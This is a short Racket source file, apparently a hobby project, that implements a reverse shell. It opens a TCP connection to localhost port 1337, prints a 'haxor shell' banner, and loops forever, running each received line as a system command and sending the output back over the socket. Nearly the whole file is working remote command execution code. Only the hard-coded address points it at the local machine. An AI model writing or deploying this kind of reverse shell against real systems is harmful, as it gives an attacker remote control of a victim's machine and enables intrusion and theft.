#lang racket

(require racket/tcp)
(require racket/system)

(define SHELL-PREFIX "[racketrev]$ ")

(define-values (IN OUT) (tcp-connect "localhost" 1337))
(fprintf OUT "Hello and Welcome to the 1337 elite Racket haxor shell~n")
(fprintf OUT "Always remember: fundies free~n~a" SHELL-PREFIX)
(flush-output OUT)

;; shell-command : String -> String
;; Executes shell commands and gets output
(define (shell-command command)
  (define SHELL-OUT "")
  ;; append-all-lines : InputPort -> String
  ;; Appends all lines of input port to string
  (define (append-all-lines in)
    (let
        ((line (read-line in)))
      (cond
        [(not (eof-object? line))
         (set! SHELL-OUT (string-append SHELL-OUT line "\n"))
         (append-all-lines in)]
        [else
         SHELL-OUT])))
  
  ;; defining the process object
  (define command-process (process command))
  
  ;; wait for command
  ((last command-process) 'wait)
  
  ;; get the exit code, 0 for success
  (define command-exit-code ((last command-process) 'exit-code))
  
  ;; check if successful..
  (cond
    [(= command-exit-code 0)
     (append-all-lines (first command-process))]
    [else (string-append "Error: " (number->string command-exit-code))]))

;; wait-for-command : InputPort -> Void
;; Waits for commands from inputport and executes them to then send back output
(define (wait-for-command in)
  (begin
    ;; writes output of shell-command to output
    (fprintf OUT "~a~n~a" (shell-command (read-line in)) SHELL-PREFIX)
    (flush-output OUT)
    (wait-for-command in))) ;; loop forever!

(wait-for-command IN)



